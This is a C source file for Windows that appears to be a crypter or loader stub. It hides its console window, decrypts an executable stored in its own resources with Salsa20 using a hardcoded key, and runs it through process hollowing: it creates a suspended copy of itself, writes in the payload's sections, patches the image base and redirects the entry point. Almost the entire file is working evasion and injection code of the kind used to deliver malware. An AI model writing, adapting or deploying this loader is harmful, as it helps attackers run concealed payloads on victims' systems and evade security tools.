#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include "salsa20.h"

// Function to extract embedded resource from this executable
unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }
    
    // if resource not found
    *dwSize = 0;
    return NULL;
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Extract the encrypted PE from our resources
    unsigned long dwSize;
    unsigned char* resourcePtr = GetResource(132, RT_RCDATA, &dwSize);

    if (resourcePtr == NULL || dwSize == 0)
    {
        // No encrypted payload found
        return 1;
    }

    // Decrypt the embedded PE using the same key/nonce as builder (it is for testing)
    uint8_t key[32] = 
    {
        0x00, 0x01, 0x02, 0x03,   0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B,   0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13,   0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B,   0x1C, 0x1D, 0x1E, 0x1F
    };

    uint8_t nonce[8] = 
    {
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22
    };

    uint32_t counter = 0;
    
    // Allocate memory for decrypted PE
    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (decrypted == NULL)
    {
        return 1;
    }

    // Copy encrypted data and decrypt it in place
    memcpy(decrypted, resourcePtr, dwSize);
    salsa20_crypt(decrypted, (uint32_t)dwSize, key, nonce, counter);

    // Perform process hollowing to execute the decrypted PE
    void* pe = decrypted;

    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    void* pImageBase;
    char currentFilePath[MAX_PATH];

    // Parse PE headers
    DOSHeader = (PIMAGE_DOS_HEADER)pe;
    NtHeader = (PIMAGE_NT_HEADERS64)((uint8_t*)pe + DOSHeader->e_lfanew);

    // Verify this is a valid PE file
    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    {
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));

        // Get path to current executable (ourselves)
        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);

        // Create a suspended process using our own executable as host
        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {

            // Allocate memory for thread context
            CONTEXT* CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
            if (CTX == NULL)
            {
                TerminateProcess(PI.hProcess, 1);
                VirtualFree(decrypted, 0, MEM_RELEASE);
                return 1;
            }
            
            CTX->ContextFlags = CONTEXT_FULL;

            // Get the thread context of the suspended process
            if (GetThreadContext(PI.hThread, CTX))
            {

                // Allocate memory in target process for our PE
                pImageBase = VirtualAllocEx
                (
                        PI.hProcess,
                        (LPVOID)(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
                );

                if (pImageBase != NULL)
                {
                    // Write PE headers to target process
                    WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                    // Write each section of the PE to target process
                    for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                    {
                        SectionHeader = (PIMAGE_SECTION_HEADER)(
                            (uint8_t*)pe + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
                        );

                        WriteProcessMemory
                        (
                                PI.hProcess,
                                (LPVOID)((uintptr_t)pImageBase + SectionHeader->VirtualAddress),
                                (LPVOID)((uintptr_t)pe + SectionHeader->PointerToRawData),
                                SectionHeader->SizeOfRawData,
                                NULL
                        );
                    }

                    // Update the image base in the target process PEB
                    WriteProcessMemory
                    (
                            PI.hProcess,
                            (LPVOID)(CTX->Rdx + 0x10),
                            &NtHeader->OptionalHeader.ImageBase,
                            sizeof(uint64_t),
                            NULL
                    );

                    // Set the entry point to our PE's entry point
                    CTX->Rcx = (uintptr_t)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
                    SetThreadContext(PI.hThread, CTX);
                    
                    // Resume execution - this will start our injected PE
                    ResumeThread(PI.hThread);

                    // Wait for the injected process to complete
                    WaitForSingleObject(PI.hProcess, INFINITE);
                    
                    // Cleanup
                    VirtualFree(CTX, 0, MEM_RELEASE);
                    VirtualFree(decrypted, 0, MEM_RELEASE);
                    return 0;
                }
            }

            // If we get here, something went wrong - cleanup and terminate
            TerminateProcess(PI.hProcess, 1);
            VirtualFree(CTX, 0, MEM_RELEASE);
        }
    }

    // Cleanup on failure
    VirtualFree(decrypted, 0, MEM_RELEASE);
    return 1;
}